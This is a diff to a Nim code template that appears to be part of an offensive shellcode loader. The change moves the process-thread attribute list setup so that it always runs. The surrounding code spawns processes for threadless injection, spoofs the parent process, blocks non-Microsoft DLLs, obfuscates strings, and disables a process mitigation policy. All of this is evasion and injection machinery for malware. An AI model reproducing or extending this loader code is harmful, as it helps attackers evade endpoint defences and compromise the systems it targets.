@@ -3141,10 +3141,11 @@ let NotepadProcIDStub * = fmt"""
             else:
                 tProcPath = newWideCString(obf(r"{customspawnprocess}"))
 
+        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
-            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
             when defined(blockDLLs):
                 const
@@ -3191,9 +3192,6 @@ let NotepadProcIDStub * = fmt"""
         
         if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
             
-            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
             var policy: DWORD64
             const PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
             policy = PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
